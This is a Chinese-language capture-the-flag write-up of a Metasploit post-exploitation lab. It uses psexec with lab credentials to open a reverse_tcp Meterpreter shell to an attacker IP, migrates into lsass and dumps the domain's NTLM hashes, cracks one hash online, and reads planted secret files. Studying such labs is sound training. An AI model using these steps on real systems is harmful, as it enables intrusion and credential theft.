# Matesploit 漏洞利用后 挑战

以下问题将帮助您更好地了解如何在开发后使用 Meterpreter。

您可以使用以下凭据来模拟通过 SMB（服务器消息块）的初始入侵（使用 exploit/windows/smb/psexec）

Username: ballen

Password: Password1

<pre><font color="#49AEE6">&lt; metasploit &gt;</font>
<font color="#49AEE6"> ------------</font>
<font color="#49AEE6">       \   ,__,</font>
<font color="#49AEE6">        \  (oo)____</font>
<font color="#49AEE6">           (__)    )\</font>
<font color="#49AEE6">              ||--|| *</font>
</pre>

<pre><u style="text-decoration-style:single">msf6</u> &gt; nmap -sS 10.10.214.4
<font color="#277FFF"><b>[*]</b></font> exec: nmap -sS 10.10.214.4

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-08 19:30 CST
Nmap scan report for 10.10.214.4 (10.10.214.4)
Host is up (0.23s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
</pre>

<pre><u style="text-decoration-style:single">msf6</u> &gt; use exploit/windows/smb/psexec 
<font color="#277FFF"><b>[*]</b></font> No payload configured, defaulting to windows/meterpreter/reverse_tcp
</pre>

<pre><u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>windows/smb/psexec</b></font>) &gt; set rhosts 10.10.214.4
rhosts =&gt; 10.10.214.4
<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>windows/smb/psexec</b></font>) &gt; set lhost 10.14.39.48
lhost =&gt; 10.14.39.48
</pre>

<pre><u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>windows/smb/psexec</b></font>) &gt; set smbuser ballen
smbuser =&gt; ballen
<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>windows/smb/psexec</b></font>) &gt; set smbpass Password1
smbpass =&gt; Password1
<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>windows/smb/psexec</b></font>) &gt; run
</pre>

meterpreter> getuid ,发现是：

    Server username: NT AUTHORITY\SYSTEM

#### 1.计算机名称是什么？

<pre><u style="text-decoration-style:single">meterpreter</u> &gt; sysinfo
Computer        : ACME-TEST
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 8
Meterpreter     : x86/windows
</pre>

ACME-TEST

#### 2.目标域是什么？

    从上一问处得知，FLASH

#### 3.用户可能创建的共享的名称是什么？

<pre><u style="text-decoration-style:single">msf6</u> post(<font color="#EC0101"><b>windows/gather/enum_shares</b></font>) &gt; run

<font color="#277FFF"><b>[*]</b></font> Running module against ACME-TEST (10.10.214.4)
<font color="#277FFF"><b>[*]</b></font> The following shares were found:
<font color="#277FFF"><b>[*]</b></font> 	Name: SYSVOL
<font color="#277FFF"><b>[*]</b></font> 	Path: C:\Windows\SYSVOL\sysvol
<font color="#277FFF"><b>[*]</b></font> 	Remark: Logon server share 
<font color="#277FFF"><b>[*]</b></font> 	Type: DISK
<font color="#277FFF"><b>[*]</b></font> 
<font color="#277FFF"><b>[*]</b></font> 	Name: NETLOGON
<font color="#277FFF"><b>[*]</b></font> 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
<font color="#277FFF"><b>[*]</b></font> 	Remark: Logon server share 
<font color="#277FFF"><b>[*]</b></font> 	Type: DISK
<font color="#277FFF"><b>[*]</b></font> 
<font color="#277FFF"><b>[*]</b></font> 	Name: speedster
<font color="#277FFF"><b>[*]</b></font> 	Path: C:\Shares\speedster
<font color="#277FFF"><b>[*]</b></font> 	Type: DISK
<font color="#277FFF"><b>[*]</b></font> 
<font color="#277FFF"><b>[*]</b></font> Post module execution completed
</pre>

前两个Remark: Logon server share，故第三个 speedster

#### 4.jchambers 用户的 NTLM 哈希是什么？

直接hashdump 无权访问。

    在内网渗透进行横向移动和权限提升时，最常用的方法是通过dump进程lsass.exe，
    从中获得明文口令或者hash。lsass.exe（Local Security Authority Subsystem Service）是一个系统进程，
    用于微软Windows系统的安全机制，它用于本地安全和登陆策略。在进程空间中，
    存有着机器的域、本地用户名和密码等重要信息。但是需要首先获得一个高的权限才能对其进行访问。

ps查看进程表，迁移至lsass进程：

<pre><u style="text-decoration-style:single">meterpreter</u> &gt; migrate 764
<font color="#277FFF"><b>[*]</b></font> Migrating from 2868 to 764...
<font color="#277FFF"><b>[*]</b></font> Migration completed successfully.
</pre>

此时再输入hashdump:

<pre><u style="text-decoration-style:single">meterpreter</u> &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:ade6f690c69ea738af21a4dc2df4adf7:::
</pre>

69596c7aa1e8daee17f8e78870e25a5c

#### 5.jchambers用户的明文密码是什么？

随便找个撞库在线网站，得到：Trustno1

#### 6.“秘密.txt”文件位于何处？

<pre><u style="text-decoration-style:single">meterpreter</u> &gt; search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 15:44:27 +0800
</pre>

C:\Program Files (x86)\Windows Multimedia Platform\

#### 7.“秘密.txt”文件中透露的推特密码是什么？

<pre><u style="text-decoration-style:single">meterpreter</u> &gt; shell
Process 3552 created.
Channel 1 created.
</pre>

<pre>C:\Windows\system32&gt;type C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
</pre>

My Twitter password is KDSvbsw3849!

#### 8.“realsecret.txt”文件在哪里？

<pre>c:\Program Files (x86)\Windows Multimedia Platform&gt;exit
exit
<u style="text-decoration-style:single">meterpreter</u> &gt; search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 16:30:24 +0800
</pre>

c:\inetpub\wwwroot\

#### 9.真正的秘密是什么？

<pre>c:\Program Files (x86)\Windows Multimedia Platform&gt;exit
exit
<u style="text-decoration-style:single">meterpreter</u> &gt; search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 16:30:24 +0800

<u style="text-decoration-style:single">meterpreter</u> &gt; cat c:\inetpub\wwwroot\realsecret.txt
<font color="#EC0101"><b>[-]</b></font> stdapi_fs_stat: Operation failed: The system cannot find the file specified.
<u style="text-decoration-style:single">meterpreter</u> &gt; cat c:\\inetpub\\wwwroot\\realsecret.txt
The Flash is the fastest man alive</pre>

The Flash is the fastest man alive
